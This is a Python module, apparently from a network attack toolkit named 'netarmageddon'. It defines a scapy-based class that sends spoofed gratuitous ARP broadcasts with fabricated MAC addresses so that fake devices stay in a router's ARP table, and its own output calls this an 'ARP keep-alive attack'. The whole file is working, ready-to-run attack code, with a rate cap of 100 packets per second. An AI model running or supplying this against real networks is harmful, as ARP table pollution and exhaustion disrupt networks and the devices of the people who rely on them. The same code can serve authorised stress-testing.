import random
import re
import threading
import time
from typing import Optional

from scapy.all import sendp
from scapy.layers.l2 import ARP, Ether
from scapy.packet import Packet
from scapy.arch import get_if_list

from netarmageddon.utils.output_manager import (
    HEAD,
    INFO,
    DEBUG,
    WARNING,
    ERROR,
    CMD,
    CLEAR,
    SUCCESS,
    BOLD,
    RESET,
    BRIGHT_CYAN,
    BRIGHT_WHITE,
    BRIGHT_YELLOW,
    THIN_DELIM,
    make_progress_bar,
)


class ARPKeepAlive:
    """Maintain fake devices in a router's ARP table."""

    MAX_PPS: int = 100  # Safety limit for packets per second

    def __init__(
        self,
        interface: str,
        base_ip: str,
        num_devices: int = 50,
        mac_prefix: str = "de:ad:00",
        interval: float = 5.0,
        cycles: int = 1,
    ) -> None:
        self.interface = interface
        self.base_ip = base_ip
        self.num_devices = num_devices
        self.mac_prefix = mac_prefix
        self.interval = interval
        self.cycles = cycles
        self.running = False
        self.thread: Optional[threading.Thread] = None
        self._stopped = False
        self.start_time = time.time()

        self._validate_interface()
        self._validate_ip()
        self._validate_mac_prefix()

        HEAD("⬡  ARP Keep-Alive — Configuration")
        CMD(f"  {'Interface':<20} {BRIGHT_CYAN}{interface}{RESET}")
        CMD(f"  {'Base IP':<20} {BRIGHT_CYAN}{base_ip}<1..{num_devices}>{RESET}")
        CMD(f"  {'Devices':<20} {BRIGHT_CYAN}{num_devices}{RESET}")
        CMD(f"  {'MAC Prefix':<20} {BRIGHT_CYAN}{mac_prefix}:xx:xx:xx{RESET}")
        CMD(f"  {'Interval':<20} {BRIGHT_CYAN}{interval}s between cycles{RESET}")
        CMD(f"  {'Cycles':<20} {BRIGHT_CYAN}{cycles}{RESET}")
        CMD(THIN_DELIM)

    def _validate_interface(self) -> None:
        DEBUG(f"Validating interface: {self.interface}")
        if self.interface not in get_if_list():
            ERROR(f"Interface '{self.interface}' not found!")
            CMD(f"  Available: {BRIGHT_CYAN}{', '.join(get_if_list())}{RESET}")
            raise ValueError(f"Interface '{self.interface}' not found")
        INFO(f"Interface {BOLD}{BRIGHT_CYAN}{self.interface}{RESET} validated")

    def _validate_ip(self) -> None:
        DEBUG(f"Validating base IP: {self.base_ip}")
        if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.$", self.base_ip):
            ERROR(f"Invalid base IP format: {self.base_ip}")
            raise ValueError("Use format like '192.168.1.'")
        INFO("Base IP format validated")

    def _validate_mac_prefix(self) -> None:
        DEBUG(f"Validating MAC prefix: {self.mac_prefix}")
        if not re.match(r"^([0-9A-Fa-f]{2}:){2}[0-9A-Fa-f]{2}$", self.mac_prefix):
            ERROR(f"Invalid MAC prefix: {self.mac_prefix}")
            raise ValueError("Use format like 'de:ad:00'")
        INFO("MAC prefix format validated")

    def _rate_limit(self, pps: int) -> int:
        if pps > self.MAX_PPS:
            WARNING(f"Rate capped: {pps} → {self.MAX_PPS} pps (safety limit)")
            return self.MAX_PPS
        return pps

    def _generate_mac(self, ip_suffix: int) -> str:
        """Generate a MAC address for this device instance.

        The prefix is deterministic (from mac_prefix + ip_suffix); the trailing
        two octets are randomised per call to avoid collisions.
        """
        mac = (
            f"{self.mac_prefix}:"
            f"{ip_suffix:02x}:"
            f"{random.randint(0, 0xff):02x}:"
            f"{random.randint(0, 0xff):02x}"
        )
        return mac

    def _generate_arp_packet(self, ip_suffix: int) -> Packet:
        ip = f"{self.base_ip}{ip_suffix}"
        mac = self._generate_mac(ip_suffix)
        return Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, hwsrc=mac, psrc=ip, pdst=ip)

    def _send_arp_announcements(self) -> None:
        try:
            INFO("🚀 Starting ARP keep-alive attack")
            pps = max(1, self.num_devices)
            allowed_pps = self._rate_limit(pps)
            delay = 1.0 / allowed_pps if allowed_pps > 0 else 0

            INFO(
                f"  Rate: {BOLD}{BRIGHT_YELLOW}{allowed_pps}{RESET} pps  |  "
                f"Cycles: {BOLD}{BRIGHT_WHITE}{self.cycles}{RESET}"
            )

            for cycle in range(1, self.cycles + 1):
                if not self.running:
                    break

                INFO(
                    f"  Cycle {BOLD}{BRIGHT_YELLOW}{cycle}{RESET}"
                    f"/{BRIGHT_WHITE}{self.cycles}{RESET}"
                )

                for i in range(1, self.num_devices + 1):
                    if not self.running:
                        break

                    pkt = self._generate_arp_packet(i)
                    try:
                        sendp(pkt, iface=self.interface, verbose=False)
                        bar = make_progress_bar(i, self.num_devices)
                        CLEAR()
                        INFO(
                            f"  Sending {bar}  "
                            f"{BRIGHT_CYAN}{i}{RESET}/{BRIGHT_WHITE}{self.num_devices}{RESET}",
                            end="\r",
                        )
                    except PermissionError as e:
                        ERROR(f"Permission error: {e}")
                        self.stop()
                        return
                    time.sleep(delay)

                INFO("")  # newline after progress bar

                if cycle < self.cycles and self.running:
                    SUCCESS(f"Cycle {cycle} complete — waiting {self.interval}s")
                    time.sleep(self.interval)

        finally:
            self.stop()

    def start(self) -> None:
        if not self.running:
            DEBUG("Spawning ARP thread")
            self.running = True
            self.thread = threading.Thread(
                target=self._send_arp_announcements, name="ARPKeepAliveThread"
            )
            self.thread.start()

    def stop(self) -> None:
        if not self.running and self._stopped:
            return
        DEBUG("Initiating ARP shutdown")
        self.running = False

        if self.thread and self.thread.is_alive():
            if threading.current_thread() is not self.thread:
                self.thread.join(timeout=5)
                if self.thread.is_alive():
                    WARNING("ARP thread shutdown delayed")

        duration = time.time() - self.start_time
        INFO(f"  Total duration: {BOLD}{BRIGHT_WHITE}{duration:.1f}s{RESET}")
        SUCCESS("ARP keep-alive terminated cleanly")
        self._stopped = True

    def user_abort(self) -> None:
        WARNING("User requested stop")
        self.stop()

    def __enter__(self) -> "ARPKeepAlive":
        self.start()
        return self

    def __exit__(self, exc_type: object, exc_val: object, exc_tb: object) -> None:
        if not self._stopped:
            self.stop()
